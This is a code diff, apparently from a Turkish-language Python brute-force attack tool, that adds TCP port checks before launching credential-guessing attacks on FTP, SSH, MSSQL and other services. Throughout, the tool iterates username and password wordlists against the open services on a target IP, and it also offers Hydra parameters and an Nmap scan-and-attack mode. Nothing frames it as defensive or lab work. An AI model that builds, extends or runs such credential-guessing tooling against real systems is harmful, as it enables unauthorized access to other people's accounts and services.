@@ -281,15 +281,44 @@ def tum_servislere_saldiri(hedef_ip, raporlayici):
         'mssql': MSSQLBruteForce
     }
     
+    # Her servis için port check yap
+    acik_servisler = {}
     for servis_adi, port in Ayarlar.PORTLAR.items():
         if servis_adi in servis_esleme:
+            print(f"[*] {servis_adi.upper()} port {port} kontrol ediliyor...")
+            
+            # Port check yap
             try:
-                print(f"\n[+] {servis_adi.upper()} servisi deneniyor...")
-                saldiri = servis_esleme[servis_adi](hedef_ip, port)
-                saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
+                import socket
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(3)
+                result = sock.connect_ex((hedef_ip, port))
+                sock.close()
+                
+                if result == 0:
+                    print(f"[+] {servis_adi.upper()} port {port} açık")
+                    acik_servisler[servis_adi] = port
+                else:
+                    print(f"[-] {servis_adi.upper()} port {port} kapalı - atlanıyor")
             except Exception as e:
-                print(f"[!] {servis_adi.upper()} hatası: {str(e)}")
+                print(f"[!] {servis_adi.upper()} port {port} kontrol hatası: {str(e)}")
                 continue
+    
+    if not acik_servisler:
+        print("[-] Hiçbir servis portu açık değil!")
+        return
+    
+    print(f"\n[+] Açık servisler: {', '.join(acik_servisler.keys()).upper()}")
+    
+    # Saldırıları başlat
+    for servis_adi, port in acik_servisler.items():
+        try:
+            print(f"\n[+] {servis_adi.upper()} servisi deneniyor...")
+            saldiri = servis_esleme[servis_adi](hedef_ip, port)
+            saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
+        except Exception as e:
+            print(f"[!] {servis_adi.upper()} hatası: {str(e)}")
+            continue
 
 def belirli_servise_saldiri(hedef_ip, servis_adi, raporlayici):
     """Belirli bir servise saldırı"""
@@ -298,6 +327,25 @@ def belirli_servise_saldiri(hedef_ip, servis_adi, raporlayici):
         return
     
     port = Ayarlar.PORTLAR[servis_adi]
+    print(f"[*] {servis_adi.upper()} port {port} kontrol ediliyor...")
+    
+    # Port check yap
+    try:
+        import socket
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(3)
+        result = sock.connect_ex((hedef_ip, port))
+        sock.close()
+        
+        if result == 0:
+            print(f"[+] {servis_adi.upper()} port {port} açık")
+        else:
+            print(f"[-] {servis_adi.upper()} port {port} kapalı - saldırı yapılamıyor")
+            return
+    except Exception as e:
+        print(f"[!] {servis_adi.upper()} port {port} kontrol hatası: {str(e)}")
+        return
+    
     servis_esleme = {
         'ftp': FTPBruteForce,
         'ssh': SSHBruteForce,
@@ -318,6 +366,7 @@ def belirli_servise_saldiri(hedef_ip, servis_adi, raporlayici):
     
     if servis_adi in servis_esleme:
         try:
+            print(f"[+] {servis_adi.upper()} saldırısı başlatılıyor...")
             saldiri = servis_esleme[servis_adi](hedef_ip, port)
             saldiri.saldir(Ayarlar.KULLANICI_ADI_LISTESI, Ayarlar.PAROLA_LISTESI)
         except Exception as e:
@@ -331,6 +380,7 @@ def parametrik_komut_isle(hedef_ip, parametreler):
     # Parametreleri analiz et
     servisler = []
     hydra_parametreleri = {}
+    nmap_yapilacak = False
     
     i = 0
     while i < len(parametreler):
@@ -352,6 +402,7 @@ def parametrik_komut_isle(hedef_ip, parametreler):
             
         # Nmap taraması (-n)
         elif param == "-n":
+            nmap_yapilacak = True
             print(f"[+] Nmap taraması başlatılıyor...")
             raporlayici = Raporlayici()
             nmap_tarama_ve_saldiri(hedef_ip, raporlayici)
@@ -403,6 +454,35 @@ def parametrik_komut_isle(hedef_ip, parametreler):
     
     print(f"[+] Saldırılacak servisler: {', '.join(servisler).upper()}")
     
+    # Her servis için port check yap
+    acik_servisler = {}
+    for servis_adi in servisler:
+        port = Ayarlar.PORTLAR[servis_adi]
+        print(f"[*] {servis_adi.upper()} port {port} kontrol ediliyor...")
+        
+        # Port check yap
+        try:
+            import socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(3)
+            result = sock.connect_ex((hedef_ip, port))
+            sock.close()
+            
+            if result == 0:
+                print(f"[+] {servis_adi.upper()} port {port} açık")
+                acik_servisler[servis_adi] = port
+            else:
+                print(f"[-] {servis_adi.upper()} port {port} kapalı - atlanıyor")
+        except Exception as e:
+            print(f"[!] {servis_adi.upper()} port {port} kontrol hatası: {str(e)}")
+            continue
+    
+    if not acik_servisler:
+        print("[-] Hiçbir servis portu açık değil!")
+        return
+    
+    print(f"\n[+] Açık servisler: {', '.join(acik_servisler.keys()).upper()}")
+    
     # Servis sınıfları eşleme
     servis_esleme = {
         'ftp': FTPBruteForce,
@@ -428,10 +508,10 @@ def parametrik_komut_isle(hedef_ip, parametreler):
     
     # Saldırıları başlat
     raporlayici = Raporlayici()
-    for servis_adi in servisler:
+    for servis_adi, port in acik_servisler.items():
         if servis_adi in servis_esleme:
             try:
-                port = Ayarlar.PORTLAR[servis_adi]
+                print(f"\n[+] {servis_adi.upper()} saldırısı başlatılıyor...")
                 saldiri = servis_esleme[servis_adi](hedef_ip, port)
                 
                 # Hydra parametrelerini uygula
